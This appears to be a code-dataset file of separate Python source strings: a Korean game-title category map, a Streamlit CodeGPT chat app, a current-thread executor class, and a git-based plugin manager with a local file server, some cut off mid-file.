    "\ncategory_map = {\n    '\ub9de\ud788\uae30 \uad00\ub828':[\n        '[\ub9de\ud788\uae30]', '\ub9de\ud788\uae30','\ud22c\ub2c8\ubc84\uc2a4', '\ub300\uc0ac', 'jpop', '\uc6b0\ud0c0\uc774\ud14c', '\uc544\uc774\ub3cc', '\ub178\ub798\ub9de\ucd94\uae30', '\uac00\uc0ac', '\uac00\uc694', '\uc601\ud654', '\uc0c1\uc2dd', '\ub178\ub798', '\uc885\ud569', \n        '\uc74c\uc545\ud034\uc988', '\uc74c\uc545 \ud034\uc988', '\ubc08 \ub2a5\ub825\ud3c9\uac00', '\ud034\uc988', '\ub9de\ucd94\uae30', '\uc560\ub2c8', '\uc77c\ubcf8', '\ubc1c\ub77c\ub4dc', '\uc560\ub2c8\uc1a1', '\ub178\ub798 \ub9de\ucd94\uae30', '\ub354\ube59', '\ud31d\uc1a1', '\ub4dc\ub77c\ub9c8',\n        ],\n    '\uba54\uc6b4\ub514 \uad00\ub828':[\n        '\uba54\uc774\ud50c\uc6b4\ube68\ub514\ud39c\uc2a4', '\uba54\uc774\ud50c \uc6b4\ube68 \ub514\ud39c\uc2a4', '\uba54\uc6b4\ub514', '\ud0dc\ucd08', '\uba54\uc6b4\ub514 3.04', \n        '\uba54\uc6b4\ub514 \uacf5\ub7b5', '\uba54\uc6b4\ub514 4.04', '\uba54\uc6b4\ub514 \uce74\ud398', '\uba54\uc774\ud50c \uc6b4\ube68 \ub514\ud39c\uc2a4 \uc2f1\uae00', '\uba54\uc6b4\ub514 5.0', \n        '\uba54\uc6b4\ub514 \ub514\ucf54', '\uba54\uc6b4', '\uba54\uc6b4\ub514 \uce6d\ud638', '\uba54\uc6b4\ub514 7.2', '\uba54\uc6b4\ub514 7.1', '\uba54\uc6b4\ub514 6.2'\n        ],\n    '\ucea0\ud398\uc778':['[\ucea0\ud398\uc778]', '\ucea0\ud398\uc778', '[\ubbf8\uc158]', '\ubbf8\uc158'],\n    '\ub514\ud39c\uc2a4':['[\ub514\ud39c\uc2a4]', '\ub514\ud39c\uc2a4'],\n    '\ub300\uc804':['[\ub300\uc804]', '\ub300\uc804'],\n    'RPG':['[RPG]', 'RPG'],\n    '\ube14\ub7ec\ub4dc':['[\ube14\ub7ec\ub4dc]', '\ube14\ub7ec\ub4dc'],\n    '\ubbf8\ub2c8\uac8c\uc784':['[\ubbf8\ub2c8\uac8c\uc784]', '\ubbf8\ub2c8\uac8c\uc784'],\n    '\ucef4\uae4c\uae30':['[\ucef4\uae4c\uae30]', '\ucef4\uae4c\uae30'],\n    '\uc11c\ubc14\uc774\ubc8c':['[\uc11c\ubc14\uc774\ubc8c]', '\uc11c\ubc14\uc774\ubc8c', '\uc0b4\uc544\ub0a8\uae30'],\n    '\ucee8\ud2b8\ub864':['[\ucee8\ud2b8\ub864]', '\ucee8\ud2b8\ub864'],\n    '\ub9ac\ub4ec\uac8c\uc784':['[\ub9ac\ub4ec\uac8c\uc784]', '\ub9ac\ub4ec\uac8c\uc784'],\n    '\ud0a4\uc6b0\uae30':['[\ud0a4\uc6b0\uae30]', '\ud0a4\uc6b0\uae30', '\uac15\ud654\ud558\uae30'],\n    '\ud37c\uc990':['[\ud37c\uc990]', '\ud37c\uc990'],\n    '\ubc00\ub9ac\uae30\ubc18':['[\ubc00\ub9ac]', '[\ubc00\ub9ac\uae30\ubc18]', '\ubc00\ub9ac'],\n    '\uc804\uc0ac\uc758\ubaa8\ud5d8':['[\uc804\uc0ac\uc758\ubaa8\ud5d8]', '\uc804\uc0ac\uc758\ubaa8\ud5d8', '\uc804\uc0ac\uc758 \ubaa8\ud5d8'],\n    '\ub514\ud50c\ub85c\ub9e4\uc2dc':['[\ub514\ud50c\ub85c\ub9e4\uc2dc]', '\ub514\ud50c\ub85c\ub9e4\uc2dc'],\n}\n\uc720\uc988\ub9f5={\n    '2022 \ud55c\uad6d\uc678\uacc4\uce68\uacf5':['2022 \ud55c\uad6d\uc678\uacc4\uce68\uacf5'],\n    '2vs6 \ud5cc\ud130 \uc778\uacf5\uc9c0\ub2a5 \uac15\ud654 \ucef4\uae4c\uae30':['2vs6 \ud5cc\ud130 \uc778\uacf5\uc9c0\ub2a5 \uac15\ud654 \ucef4\uae4c\uae30'],\n    '3vs5 \ud5cc\ud130 \ucef4\uae4c\uae30 \ud655\uc7a5\ud310':['3vs5 \ud5cc\ud130 \ucef4\uae4c\uae30 \ud655\uc7a5\ud310'],\n    '4\uc778 \ud611\ub3d9 \ucef4\uae4c\uae30':['4\uc778 \ud611\ub3d9 \ucef4\uae4c\uae30'],\n    '63way \uc720\ub2db \ub9c9\uae30':['63way \uc720\ub2db \ub9c9\uae30', '63way \uc720\ub2db\ub9c9\uae30'],\n    'AOT \ub79c\ub364 \ub514\ud39c\uc2a4':['AOT \ub79c\ub364 \ub514\ud39c\uc2a4', 'AOT\ub514\ud39c\uc2a4'],\n    'AOT \uc655\uad6d \uc9c0\ud0a4\uae30 \u221a4':['AOT \uc655\uad6d \uc9c0\ud0a4\uae30 \u221a4'],\n    'Black Angels - Overwhelming':['Black Angels - Overwhelming'],\n    'DPS \uac15\ud654\ud558\uae30':['DPS \uac15\ud654\ud558\uae30'],\n    'Deus Ex Machina':['Deus Ex Machina'],\n    'Elysium RPG Beta':['Elysium RPG Beta'],\n    'Lotr - Shadow of War':['Lotr - Shadow of War'],\n    'Select Type Defence':['Select Type Defence'],\n    'Space Strike':['Space Strike'],\n    'Stock Market':['Stock Market', 'Stock market'],\n    'The Unknown Land':['The Unknown Land'],\n    'Vampiric - Broken Arrow':['Vampiric - Broken Arrow'],\n    'Vertigo of The Bow':['Vertigo of The Bow'],\n    'WW2 \uc720\ub7fd\uc804\uc120 S':['WW2 \uc720\ub7fd\uc804\uc120 S'],\n    'WW2 \uc804\uc7c1\ud788\uc5b4\ub85c 2\ucc28\uc138\uacc4\ub300\uc804':['WW2 \uc804\uc7c1\ud788\uc5b4\ub85c 2\ucc28\uc138\uacc4\ub300\uc804', 'WW2  \uc804\uc7c1\uc601\uc6c5 2\ucc28\uc138\uacc4\ub300\uc804'],\n    'WW3 : \ucca0\uc758 \uc7a5\ub9c9 \ub108\uba38':['WW3 : \ucca0\uc758 \uc7a5\ub9c9 \ub108\uba38'],\n    'WW3 \uc138\uacc4\uc804\uc5ed':['WW3 \uc138\uacc4\uc804\uc5ed'],\n    '[1\ucc28 \uc138\uacc4\ub300\uc804] 1\ucc28 \uc720\ub7fd\uc804\uc120':['1\ucc28 \uc720\ub7fd\uc804\uc120'],\n    '\uac10\uc2dc\uc790\uc758 5\uc77c \ubc24':['\uac10\uc2dc\uc790\uc758 5\uc77c \ubc24'],\n    '\uad11\uc804\uc0ac \uac15\ud654\ud558\uae30':['\uad11\uc804\uc0ac \uac15\ud654\ud558\uae30'],\n    '\uadc0\uba78\uc758 \uce7c\ub0a0':['\uadc0\uba78\uc758 \uce7c\ub0a0 2.'],\n    '\uadc0\uba78\uc758 \uce7c\ub0a0 \ub514\ud39c\uc2a4':['\uadc0\uba78\uc758 \uce7c\ub0a0 \ub514\ud39c\uc2a4'],\n    '\uadc0\uba78\uc758\uce7c\ub0a0 \ubbf8\ub2c8\ubaa8\ud5d8':['\uadc0\uba78\uc758\uce7c\ub0a0 \ubbf8\ub2c8\ubaa8\ud5d8'],\n    '\uadf8\ub0e5 \ud754\ud55c \ube14\ub7ec\ub4dc':['\uadf8\ub0e5 \ud754\ud55c \ube14\ub7ec\ub4dc'],\n    '\ub098\uc774\ud2b8\ub7f0 \uc5d8\ub9ac\uc2a4 / Knight run Elice':['\ub098\uc774\ud2b8\ub7f0 \uc5d8\ub9ac\uc2a4 / Knight run Elice', '\ub098\uc774\ud2b8\ub7f0 \uc5d8\ub9ac\uc2a4 / Knight_run_Elice'],\n    '\ub208\uce58\ubcf4\uba70 \uc218\ub9ac\ud558\uae30 Elemental':['\ub208\uce58\ubcf4\uba70 \uc218\ub9ac\ud558\uae30 Elemental', '\ub208\uce58\ubcf4\uba70 \uc218\ub9ac\ud558\uae30 \uc5d8\ub9ac\uba58\ud0c8'],\n    '\ub274 \uc6d0\ud53c\uc2a4 \ub79c\ub364 \ub514\ud39c\uc2a4':['\ub274 \uc6d0\ud53c\uc2a4 \ub79c\ub364 \ub514\ud39c\uc2a4', '\ub274 \uc6d0 \ud53c \uc2a4 \ub79c \ub364 \ub514 \ud39c \uc2a4'],\n    '\ub2f9\ucca8\ub41c \uad70\uc778 \ud0a4\uc6b0\uae30':['\ub2f9\ucca8\ub41c \uad70\uc778 \ud0a4\uc6b0\uae30'],\n    '\ub2f9\ucca8\ub41c \ud788\uc5b4\ub85c \ud0a4\uc6b0\uae30 VERY HARD':['\ub2f9\ucca8\ub41c \ud788\uc5b4\ub85c \ud0a4\uc6b0\uae30 VERY HARD', '\ub2f9\ucca8\ub41c \ud788\uc5b4\ub85c \ud0a4\uc6b0\uae30 VeryHard'],\n    '\ub358\uc804\uc758\uc138\uacc4':['\ub358\uc804\uc758\uc138\uacc4', '\ub358\uc804\uc758\uc138\uacc4 RPG', '\ub358\uc804\uc758 \uc138\uacc4 RPG'],\n    '\ub371 \ube4c\ub529 \ub514\ud39c\uc2a4':['\ub371 \ube4c\ub529 \ub514\ud39c\uc2a4', '\ub371\ube4c\ub529 \ub514\ud39c\uc2a4'],\n    '\ub3c4\ub451 \uac15\ud654\uae30':['\ub3c4\ub451 \uac15\ud654\uae30'],\n    '\ub4dc\ub798\uace4\ubcfc \ub79c\ub364 \ub514\ud39c\uc2a4':['\ub4dc\ub798\uace4\ubcfc \ub79c\ub364 \ub514\ud39c\uc2a4'],\n    '\ub514\uc624\ud39c\uc2a4':['\ub514\uc624\ud39c\uc2a4', '\ub514\uc624 \ud39c\uc2a4'],\n    '\ub514\uc9c0\ubaac \uc5b4\ub4dc\ubca4\ucc98 RPG':['\ub514\uc9c0\ubaac \uc5b4\ub4dc\ubca4\ucc98 RPG'],\n    '\ub514\uc9c0\ubaac \uc6b4\ube68 \ub514\ud39c\uc2a4':['\ub514\uc9c0\ubaac \uc6b4\ube68 \ub514\ud39c\uc2a4'],\n    '\ub514\uc9c0\ubaac \uc6d4\ub4dc M':['\ub514\uc9c0\ubaac \uc6d4\ub4dc M', '\ub514\uc9c0\ubaac \uc6d4\ub4dcM'],\n    '\ub514\uc9c0\ubaac\uc758 \ubaa8\ud5d8':['\ub514\uc9c0\ubaac\uc758 \ubaa8\ud5d8', '\ub514\uc9c0\ubaac \uc804\uc0ac\uc758 \ubaa8\ud5d8ALL'],\n    '\ub514\ud50c\ub85c\uba54\uc2dc \ud06c\ub8e8\uc138\uc774\ub4dc':['\ub514\ud50c\ub85c\uba54\uc2dc \ud06c\ub8e8\uc138\uc774\ub4dc'],\n    '\ub514\ud50c\ub85c\uba54\uc2dcAI\ud611\ub3d9 \uc0bc\uad6d\uc2dc\ub300':['\ub514\ud50c\ub85c\uba54\uc2dcAI\ud611\ub3d9 \uc0bc\uad6d\uc2dc\ub300'],\n    '\ub77c\uc774\uc5b4 \uac8c\uc784':['\ub77c\uc774\uc5b4\uac8c\uc784', '\ub77c\uc774\uc5b4 \uac8c\uc784'],\n    '\ub79c\ub364 \ub2a5\ub825 \ud06c\ub798\ud504\ud2b8 \ube60\ub978\ubb34\ud55c NS':['\ub79c\ub364 \ub2a5\ub825 \ud06c\ub798\ud504\ud2b8 \ube60\ub978\ubb34\ud55c NS'],\n    '\ub79c\ub364 \ub2a5\ub825 \ud06c\ub798\ud504\ud2b8(\ub79c\ub2a5\ud06c) \ud558\uc81c':['\ub79c\ub364 \ub2a5\ub825 \ud06c\ub798\ud504\ud2b8(\ub79c\ub2a5\ud06c) \ud558\uc81c'],\n    '\ub79c\ub364 \ub85c\ub610 \ud788\uc5b4\ub85c \ubc30\ud2c0':['\ub79c\ub364 \ub85c\ub610 \ud788\uc5b4\ub85c \ubc30\ud2c0'],\n    '\ub79c\ub364 \ud788\uc5b4\ub85c \ub514\ud39c\uc2a4':['\ub79c\ub364 \ud788\uc5b4\ub85c \ub514\ud39c\uc2a4'],\n    '\ub79c\ub364\uc2a4\ud0ac\uc11c\ubc14\uc774\ubc8c':['\ub79c\ub364\uc2a4\ud0ac\uc11c\ubc14\uc774\ubc8c', '\ub79c\ub364 \uc2a4\ud0ac \uc11c\ubc14\uc774\ubc8c'],\n    '\ub79c\ub364\ud611\ub3d9\ucee8\ud2b8\ub864 \uc774\ubaa8\ud0c8':['\ub79c\ub364\ud611\ub3d9\ucee8\ud2b8\ub864 \uc774\ubaa8\ud0c8'],\n    '\ub7ec\ube14\ub9ac\uc988 \ube14\ub7ec\ub4dc':['\ub7ec\ube14\ub9ac\uc988 \ube14\ub7ec\ub4dc'],\n    '\ub808\ubca8\ucef4\uae4c\uae30':['\ub808\ubca8\ucef4\uae4c\uae30'],\n    '\ub9ac\uadf8\uc624\ube0c\uc2a4\ud0c0\ud06c\ub798\ud504\ud2b8':['\ub9ac\uadf8\uc624\ube0c\uc2a4\ud0c0\ud06c\ub798\ud504\ud2b8'],\n    '\ub9ac\ub4ec \uc800\uae00\ub9c1 \ub9c9\uae30':['\ub9ac\ub4ec \uc800\uae00\ub9c1 \ub9c9\uae30'],\n    '\ub9b4\ub808\uc774 \ub9ac\ub4ec\uac8c\uc784':['\ub9b4\ub808\uc774 \ub9ac\ub4ec\uac8c\uc784'],\n    '\ub9c8\ub140\uc758 \ubbf8\uad81':['\ub9c8\ub140\uc758 \ubbf8\uad81'],\n    '\ub9c8\ub9b0 \ud0a4\uc6b0\uae30 Protect':['\ub9c8\ub9b0 \ud0a4\uc6b0\uae30 Protect'],\n    '\uba54\uc774\ud50c \ubf51\uae30 \ub514\ud39c\uc2a4':['\uba54\uc774\ud50c \ubf51\uae30 \ub514\ud39c\uc2a4'],\n    '\uba54\uc774\ud50c \uc6b4\ube68 \ub514\ud39c\uc2a4':['\uba54\uc774\ud50c\uc6b4\ube68\ub514\ud39c\uc2a4', '\uba54\uc774\ud50c \uc6b4\ube68 \ub514\ud39c\uc2a4', '\uba54\uc6b4\ub514', '\ud0dc\ucd08', '\uba54\uc6b4\ub514 3.04', '\uba54\uc6b4\ub514 \uacf5\ub7b5', '\uba54\uc6b4\ub514 4.04', '\uba54\uc6b4\ub514 \uce74\ud398', '\uba54\uc774\ud50c \uc6b4\ube68 \ub514\ud39c\uc2a4 \uc2f1\uae00', '\uba54\uc6b4\ub514 5.0', '\uba54\uc6b4\ub514 \ub514\ucf54', '\uba54\uc6b4', '\uba54\uc6b4\ub514 \uce6d\ud638', '\uba54\uc6b4\ub514 7.2', '\uba54\uc6b4\ub514 7.1', '\uba54\uc6b4\ub514 6.2'],\n    '\uba54\uc774\ud50c \uc6d4\ub4dc M':['\uba54\uc774\ud50c \uc6d4\ub4dc M'],\n    '\uba54\uc774\ud50c\ubcf4\uc2a4\ub514\ud39c\uc2a4':['\uba54\uc774\ud50c\ubcf4\uc2a4\ub514\ud39c\uc2a4'],\n    '\ubb34\uae30\ud0a4\uc6b0\uae30':['\ubb34\uae30\ud0a4\uc6b0\uae30'],\n    '\ubb34\ud611\ub514\ud39c\uc2a4 43':['\ubb34\ud611\ub514\ud39c\uc2a4 43', '\ubb34\ud611\ub514\ud39c\uc2a443'],\n    '\ubc14\uc778\ub4dc \ub514\ud39c\uc2a42':['\ubc14\uc778\ub4dc \ub514\ud39c\uc2a42'],\n    '\ubcbd\uc9d3\uace0 \ubc31\ub9cc \uc800\uae00\ub9c1 \ub9c9\uae30':['\ubcbd\uc9d3\uace0 \ubc31\ub9cc \uc800\uae00\ub9c1 \ub9c9\uae30'],\n    '\ube0c\ub11b\uc758 \uae30\uc0ac':['\ube0c\ub11b\uc758 \uae30\uc0ac', '\uc655\uc758\uae30\uc0ac \ube0c\ub11b \uacf5\uc131\uc804'],\n    '\ube14\ub9ac\uce58 \ud638\ub85c \ub514\ud39c\uc2a4':['\ube14\ub9ac\uce58 \ud638\ub85c \ub514\ud39c\uc2a4'],\n    '\ube44\ucf58\ube14\ub7ec\ub4dc':['\ube44\ucf58\ube14\ub7ec\ub4dc'],\n    '\ube68\ubb34\uc601\uc6c5 vs 7\ucef4\uae4c\uae30 21':['\ube68\ubb34\uc601\uc6c5 vs 7\ucef4\uae4c\uae30 21'],\n    '\ube68\ubb34\uc601\uc6c5 vs \ud504\ub85c7\uc778':['\ube68\ubb34\uc601\uc6c5 vs \ud504\ub85c7\uc778'],\n    '\uc0ac\uc774\ud0c0\ub9c8 \uc9d1 \uc9c0\ud0a4\uae30':['\uc0ac\uc774\ud0c0\ub9c8 \uc9d1 \uc9c0\ud0a4\uae30'],\n    '\uc0ac\uc790\ud0a4\uc6b0\uae30':['\uc0ac\uc790\ud0a4\uc6b0\uae30'],\n    '\uc0bc\uad6d\uc9c0 \ud328\uc655\uc804':['\uc0bc\uad6d\uc9c0 \ud328\uc655\uc804'],\n    '\uc0bc\uad6d\uc9c0 \ud3ec\ucee4 \ub514\ud39c\uc2a4':['\uc0bc\uad6d\uc9c0 \ud3ec\ucee4 \ub514\ud39c\uc2a4'],\n    '\uc120\uc7a5 \ud0a4\uc6b0\uae30':['\uc120\uc7a5 \ud0a4\uc6b0\uae30'],\n    '\uc2a4\ud0c01 reversed \ucea0\ud398\uc778':['\uc2a4\ud0c01 reversed \ucea0\ud398\uc778', '\uc2a4\ud0c01 reverse (\ub4a4\ubc14\ub010) \ucea0\ud398\uc778'],\n    '\uc2a4\ud3f0\uc9c0\ubc25\uc9c0\ud0a4\uae30':['\uc2a4\ud3f0\uc9c0\ubc25\uc9c0\ud0a4\uae30'],\n    '\uc2e0\ub300\ub9ac \uc9c0\ud0a4\uae302':['\uc2e0\ub300\ub9ac\uc9c0\ud0a4\uae302 ', '\ub9c8\uc744(\uc2e0\ub300\ub9ac) \uc9c0\ud0a4\uae30 2'],\n    '\uc2e0\ub300\ub9ac \uc9c0\ud0a4\uae303':['\uc2e0\ub300\ub9ac \uc9c0\ud0a4\uae30 3 '],\n    '\ub9c8\uc744\ud68c\uad00 \uc9c0\ud0a4\uae30':['\ub9c8\uc744\ud68c\uad00 \uc9c0\ud0a4\uae30'],\n    '\uc2e0\uc758 \uc2ec\uc7a5 \uc6d0\uc2e0 \uacfc\uc804\ub958':['\uc2e0\uc758\\ufeff \uc2ec\uc7a5\\ufeff \uc6d0\uc2e0\\ufeff \uacfc\uc804\ub958'],\n    '\uc4f0\ub808\uae30\uc12c\uc5d0\uc11c \uc0b4\uc544\ub0a8\uae30':['\uc4f0\ub808\uae30\uc12c\uc5d0\uc11c \uc0b4\uc544\ub0a8\uae30'],\n    '\uc544\ub974\uc0ac\uc774 \ud1a0\ud0c8\uc6cc':['\uc544\ub974\uc0ac\uc774 \ud1a0\ud0c8\uc6cc'],\n    '\uc544\uc774\uc5b4 \uadf8 \uc5b4\ub518\uac00':['\uc544\uc774\uc5b4 \uadf8 \uc5b4\ub518\uac00'],\n    '\uc548\uc2dc\uc131 \uc804\ud22c':['\uc548\uc2dc\uc131 \uc804\ud22c'],\n    '\uc560\ub2c8 \uce90\ub9ad\ud130 \ub514\ud39c\uc2a4':['\uc560\ub2c8 \uce90\ub9ad\ud130 \ub514\ud39c\uc2a4'],\n    '\uc560\ub2c8\uac15\ud654\ub514\ud39c\uc2a4M':['\uc560\ub2c8\uac15\ud654\ub514\ud39c\uc2a4M'],\n    '\uc5b8\ub370\ub4dc \ub514\ud39c\uc2a4':['\uc5b8\ub370\ub4dc \ub514\ud39c\uc2a4'],\n    '\uc601\uc6c5\uace8\ub77c\ucef4\uae4c\uae30':['\uc601\uc6c5\uace8\ub77c\ucef4\uae4c\uae30'],\n    '\uc655\uc758\uae30\uc0ac \uc9c4\ubaa9 \ub300\ub959 \ub0b4\uc804':['\uc655\uc758\uae30\uc0ac \uc9c4\ubaa9 \ub300\ub959 \ub0b4\uc804', '\uc655\uc758\uae30\uc0ac CPU: \uc9c4\ubaa9 \ub300\ub959 \ub0b4\uc804'],\n    '\uc695 \ub098\uc624\ub294 \ucee8\ud2b8\ub864':['\uc695 \ub098\uc624\ub294 \ucee8\ud2b8\ub864'],\n    '\uc6a9\uc0ac \uc8fc\uc81c\uc5d0 \uac74\ubc29\uc9c0\ub2e4':['\uc6a9\uc0ac \uc8fc\uc81c\uc5d0 \uac74\ubc29\uc9c0\ub2e4'],\n    '\uc6a9\uc0ac\uc758 \ubaa8\ud5d8 - Elemental Soul':['\uc6a9\uc0ac\uc758 \ubaa8\ud5d8 - Elemental Soul'],\n    '\uc6a9\uc0ac\uc758 \ubaa8\ud5d8 : \ud63c\ub3c8\uc758 \ud0d1':['\uc6a9\uc0ac\uc758 \ubaa8\ud5d8 : \ud63c\ub3c8\uc758 \ud0d1'],\n    '\uc6b4\uc804\uba74\ud5c8\ub530\uae30':['\uc6b4\uc804\uba74\ud5c8\ub530\uae30', '\uc6b4\uc804\uba74\ud5c8'],\n    '\uc720\ub2db\uac15\ud654\ud0a4\uc6b0\uae30':['\uc720\ub2db\uac15\ud654\ud0a4\uc6b0\uae30'],\n    '\uc774 \ube4c\uc5b4\uba39\uc744 \ub358\uc804':['\uc774 \ube4c\uc5b4\uba39\uc744 \ub358\uc804'],\n    '\uc778\uc0dd \uc0b4\uc544\uac00\uae30':['\uc778\uc0dd \uc0b4\uc544\uac00\uae30', '\uc778\uc0dd\uc0b4\uc544\uac00\uae30'],\n    '\uc77c\uc8fc",
    "import streamlit as st\nfrom judini.codegpt import CodeGPTPlus\nfrom dotenv import load_dotenv\nimport os\nimport time\nload_dotenv()\n\n\n# connect with codegpt\napi_key= os.getenv('CODEGPT_API_KEY')\nagent_id= os.getenv('CODEGPT_AGENT_ID')\norg_id= os.getenv('ORG_ID')\n\nst.set_page_config(layout=\"centered\")\n\nst.title(\"Agent FAQ\")\nst.markdown(\"---\")\n\n# init chat\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\n# Display chat\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"])\n\n# User input\nif prompt := st.chat_input(\"How can I help you?\"):\n    # user message history\n    st.session_state.messages.append({\"role\":\"user\", \"content\": prompt})\n\n    with st.chat_message(\"user\"):\n        st.markdown(prompt)\n\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            message_placeholder = st.empty()\n            full_response = \"\"\n\n\n            # connect CodeGPT SDK\n            codegpt = CodeGPTPlus(api_key=api_key, org_id=org_id)\n            messages = st.session_state.messages\n\n            response_completion = codegpt.chat_completion(agent_id=agent_id, messages=messages, stream=True)\n\n            for response in response_completion:\n                time.sleep(0.05)\n                full_response += (response or \"\")\n                message_placeholder.markdown(full_response + \"|\")\n\n            message_placeholder.markdown(full_response)\n    \n    st.session_state.messages.append({\"role\":\"assistant\", \"content\": full_response})\n\n\n\n",
    "import queue\nimport threading\nfrom concurrent.futures import Executor, Future\n\n\nclass _WorkItem:\n    \"\"\"\n    Represents an item needing to be run in the executor.\n    Copied from ThreadPoolExecutor (but it's private, so we're not going to rely on importing it)\n    \"\"\"\n\n    def __init__(self, future, fn, args, kwargs):\n        self.future = future\n        self.fn = fn\n        self.args = args\n        self.kwargs = kwargs\n\n    def run(self):\n        if not self.future.set_running_or_notify_cancel():\n            return\n        try:\n            result = self.fn(*self.args, **self.kwargs)\n        except BaseException as exc:\n            self.future.set_exception(exc)\n            # Break a reference cycle with the exception 'exc'\n            self = None\n        else:\n            self.future.set_result(result)\n\n\nclass CurrentThreadExecutor(Executor):\n    \"\"\"\n    An Executor that actually runs code in the thread it is instantiated in.\n    Passed to other threads running async code, so they can run sync code in\n    the thread they came from.\n    \"\"\"\n\n    def __init__(self):\n        self._work_thread = threading.current_thread()\n        self._work_queue = queue.Queue()\n        self._broken = False\n\n    def run_until_future(self, future):\n        \"\"\"\n        Runs the code in the work queue until a result is available from the future.\n        Should be run from the thread the executor is initialised in.\n        \"\"\"\n        # Check we're in the right thread\n        if threading.current_thread() != self._work_thread:\n            raise RuntimeError(\n                \"You cannot run CurrentThreadExecutor from a different thread\"\n            )\n        future.add_done_callback(self._work_queue.put)\n        # Keep getting and running work items until we get the future we're waiting for\n        # back via the future's done callback.\n        try:\n            while True:\n                # Get a work item and run it\n                work_item = self._work_queue.get()\n                if work_item is future:\n                    return\n                work_item.run()\n                del work_item\n        finally:\n            self._broken = True\n\n    def submit(self, fn, *args, **kwargs):\n        # Check they're not submitting from the same thread\n        if threading.current_thread() == self._work_thread:\n            raise RuntimeError(\n                \"You cannot submit onto CurrentThreadExecutor from its own thread\"\n            )\n        # Check they're not too late or the executor errored\n        if self._broken:\n            raise RuntimeError(\"CurrentThreadExecutor already quit or is broken\")\n        # Add to work queue\n        f = Future()\n        work_item = _WorkItem(f, fn, args, kwargs)\n        self._work_queue.put(work_item)\n        # Return the future\n        return f\n",
    "import argparse\nimport glob\nimport http.server\nimport importlib.resources\nimport io\nimport json\nimport mimetypes\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport urllib.parse\n\nif (\n    sys.version_info.major,\n    sys.version_info.minor,\n) < (3, 11):\n    import tomli as toml\nelse:\n    import tomllib as toml\n\n\ndef resolve_git_repo(url, ssh=False):\n    if (\n        not url.startswith(\"http\")\n        and not url.startswith(\"ssh\")\n        and not url.startswith(\"git@\")\n    ):\n        url = f\"git@github.com:{url}.git\" if ssh else f\"https://github.com/{url}\"\n    plugin_dir = \"/\".join(url.split(\":\")[-1].split(\"/\")[-2:]).strip(\".git\")\n    return url, plugin_dir\n\n\ndef installed_plugins(plugin_dir):\n    index = \"index.html\"\n    prefix_len = len(plugin_dir) + 1\n    postfix_len = len(index) + 1\n    plugins = []\n    for m in glob.glob(f\"{plugin_dir}/**/{index}\", recursive=True):\n        directory = m[prefix_len:-postfix_len]\n        plugin = {\"name\": directory}\n        config_path = os.path.join(plugin_dir, directory, \"fss.toml\")\n        if os.path.exists(config_path):\n            with open(config_path, \"rb\") as fd:\n                plugin.update(toml.load(fd))\n        plugin[\"directory\"] = directory\n        plugins.append(plugin)\n    return sorted(plugins, key=lambda m: m[\"name\"])\n\n\ndef git(*args, cwd=None, help_message=\"\"):\n    assert cwd is not None\n    try:\n        subprocess.run([\"git\", \"-C\", cwd, *args], check=True)\n    except FileNotFoundError:\n        print(\n            \"Error: git command not found, git is required for plugin install / update\",\n            file=sys.stderr,\n        )\n        sys.exit(1)\n    except subprocess.CalledProcessError:\n        print(f\"Error: {help_message}\", file=sys.stderr)\n        sys.exit(1)\n\n\ndef install(args):\n    repo, plugin_dir = resolve_git_repo(args.plugin, ssh=args.ssh)\n    git(\n        \"clone\",\n        repo,\n        plugin_dir,\n        cwd=args.plugin_dir,\n        help_message=\"Perhaps the plugin specified is already installed, did you mean to run `update`?\",\n    )\n    print(\"Succesfully installed:\", plugin_dir)\n\n\ndef update(args):\n    plugins = (\n        args.plugins if len(args.plugins) > 0 else installed_plugins(args.plugin_dir)\n    )\n    for plugin in plugins:\n        repo, plugin_dir = resolve_git_repo(plugin[\"directory\"])\n        cwd = os.path.join(args.plugin_dir, plugin_dir)\n        if not os.path.exists(os.path.join(cwd, \".git\")):\n            print(\n                \"Warning: plugin is not git repo, skipping:\",\n                plugin_dir,\n                file=sys.stderr,\n            )\n            continue\n        git(\n            \"pull\",\n            cwd=cwd,\n            help_message=\"Perhaps the plugin isn't already installed, did you mean to run `install`?\",\n        )\n        print(\"Succesfully updated:\", plugin_dir)\n\n\ndef serve(args):\n    class PluginRequestHandler(http.server.BaseHTTPRequestHandler):\n        cwd = \"/\"\n\n        def send_file(\n            self, f, fsize, ctype, encoding=None, last_modified=None, revalidate=False\n        ):\n            self.send_response(http.server.HTTPStatus.OK)\n            self.send_header(\"Content-type\", ctype)\n            self.send_header(\"Content-Length\", str(fsize))\n            if encoding is not None:\n                self.send_header(\"Content-Encoding\", encoding)\n            if last_modified is not None:\n                self.send_header(\"Last-Modified\", last_modified)\n            if revalidate:\n                self.send_header(\"Cache-Control\", \"no-cache\")\n            self.end_headers()\n            return f\n\n        def send_as_json(self, d):\n            text_io = io.TextIOWrapper(io.BytesIO(), encoding=\"utf-8\")\n            json.dump(d, text_io)\n            f = text_io.detach()\n            fsize = f.tell()\n            f.seek(0)\n            return self.send_file(f, fsize, \"application/json\")\n\n        def send_file_at_path(self, path, revalidate=False):\n            if not os.path.exists(path):\n                return self.send_error(\n                    http.server.HTTPStatus.NOT_FOUND, f\"File not found {path}\"\n                )\n            if os.path.isdir(path):\n                return self.send_error(\n                    http.server.HTTPStatus.BAD_REQUEST,\n                    f\"File attempting to open is directory {path}\",\n                )\n            ctype, encoding = mimetypes.guess_type(path)\n            if ctype is None:\n                ctype = \"application/octet-stream\"\n            f = open(path, \"rb\")\n            fs = os.fstat(f.fileno())\n            return self.send_file(\n                f,\n                fs[6],\n                ctype,\n                encoding=encoding,\n                last_modified=self.date_time_string(fs.st_mtime),\n                revalidate=revalidate,\n            )\n\n        def redirect(self, url):\n            self.send_response(http.server.HTTPStatus.FOUND)\n            self.send_header(\"Location\", url)\n            self.end_headers()\n\n        @staticmethod\n        def query_list():\n       ",
